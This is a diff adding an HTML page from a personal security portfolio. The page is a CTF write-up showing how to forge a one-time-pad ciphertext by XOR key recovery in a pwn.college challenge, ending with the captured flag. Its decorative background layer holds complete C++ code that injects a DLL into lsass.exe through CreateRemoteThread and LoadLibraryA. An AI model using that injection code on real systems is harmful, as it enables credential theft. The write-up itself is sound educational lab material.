@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 One-Time Pad Tampering — Integrity Flaw Exploit</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🔐 One-Time Pad Tampering — Integrity Flaw Exploit" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🔐 One-Time Pad Tampering — Integrity Flaw Exploit</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Challenge Title:</strong> One-Time-pad<br />
+<strong>Platform:</strong> pwn.college<br />
+<strong>Category:</strong> Cryptography<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Tags:</strong> <code class="language-plaintext highlighter-rouge">OTP</code>, <code class="language-plaintext highlighter-rouge">XOR</code>, <code class="language-plaintext highlighter-rouge">message integrity</code></p>
+
+<hr />
+
+<h2 id="-description">📝 Description</h2>
+
+<blockquote>
+  <p>The <strong>One-Time Pad</strong> is known for being <strong>perfectly secure</strong>, but only for <em>confidentiality</em>.<br />
+It <strong>does not</strong> provide <strong>integrity</strong> — meaning, if an attacker can tamper with the ciphertext, they can manipulate the message undetected.</p>
+
+  <p>This challenge demonstrates that by letting you interact with a script that:</p>
+  <ul>
+    <li>XORs a plaintext command (like <code class="language-plaintext highlighter-rouge">sleep</code>) with a <strong>secret key</strong></li>
+    <li>And prints the resulting <strong>ciphertext</strong></li>
+  </ul>
+
+  <p>You are then allowed to send your <strong>own ciphertext</strong> to the server.</p>
+
+  <p>🔥 Goal: Modify the ciphertext so that the server thinks it received <code class="language-plaintext highlighter-rouge">flag!</code> instead of <code class="language-plaintext highlighter-rouge">sleep</code>.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-given-files">📂 Given Files</h2>
+
+<h3 id="dispatcher"><code class="language-plaintext highlighter-rouge">dispatcher</code></h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util.strxor</span> <span class="kn">import</span> <span class="n">strxor</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/.key</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="nf">strxor</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">sleep</span><span class="sh">"</span><span class="p">,</span> <span class="n">key</span><span class="p">[:</span><span class="mi">5</span><span class="p">])</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">TASK: </span><span class="si">{</span><span class="n">ciphertext</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="worker">Worker</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Util.strxor</span> <span class="kn">import</span> <span class="n">strxor</span>
+<span class="kn">import</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/.key</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="n">line</span> <span class="p">:</span><span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">readline</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">TASK: </span><span class="sh">"</span><span class="p">):</span> <span class="k">continue</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="nf">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">cipher_len</span> <span class="o">=</span> <span class="nf">min</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="nf">strxor</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="n">cipher_len</span><span class="p">],</span> <span class="n">key</span><span class="p">[:</span><span class="n">cipher_len</span><span class="p">])</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Hex of plaintext: </span><span class="si">{</span><span class="n">plaintext</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Received command: </span><span class="si">{</span><span class="n">plaintext</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">plaintext</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">"</span><span class="s">sleep</span><span class="sh">"</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Sleeping!</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">plaintext</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">"</span><span class="s">flag!</span><span class="sh">"</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Victory! Your flag:</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">())</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Unknown command!</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="understanding-the-logic">Understanding the Logic</h3>
+<ul>
+  <li>The dispatcher encrypts b”sleep” with the unknown key:
+<code class="language-plaintext highlighter-rouge">cipher = XOR(sleep, key)</code></li>
+  <li>We can reverse it:
+<code class="language-plaintext highlighter-rouge">Key = XOR(cipher, sleep)</code></li>
+  <li>Now that we have the key, we can forge a new ciphertext:
+<code class="language-plaintext highlighter-rouge">new_cipher = XOR(key, b"flag!")</code>
+—
+    <h2 id="exploitation-steps">Exploitation Steps</h2>
+    <h3 id="1-get-the-ciphertext">1. Get the ciphertext</h3>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/challenge/dispatcher
+TASK: 12cb6cabf1
+</code></pre></div>    </div>
+    <h3 id="2-reverse-xor-to-extract-the-key">2. Reverse XOR to extract the key</h3>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">'</span><span class="s">12cb6cabf1</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sleep</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">p</span><span class="p">)])</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">key</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>
+<span class="sh">'</span><span class="s">61a709ce81</span><span class="sh">'</span>
+</code></pre></div>    </div>
+    <h3 id="3-craft-new-command-flag">3. Craft new command: flag!</h3>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag!</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">forged_cipher</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">a</span> <span class="o">^</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">key</span><span class="p">)])</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">forged_cipher</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>
+<span class="sh">'</span><span class="s">07cb68a9a0</span><span class="sh">'</span>
+</code></pre></div>    </div>
+    <h3 id="4-send-the-forged-ciphertext-to-the-worker">4. Send the forged ciphertext to the worker</h3>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/challenge/worker
+TASK: 07cb68a9a0
+Hex of plaintext: 666c616721
+Received <span class="nb">command</span>: b<span class="s1">'flag!'</span>
+Victory! Your flag:
+pwn.college<span class="o">{</span>MeLKBB0BFKbG27bEGfXW-q6rujV.01M3kjNxwSM0IzMyEzW<span class="o">}</span>
+</code></pre></div>    </div>
+    <hr />
+  </li>
+</ul>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
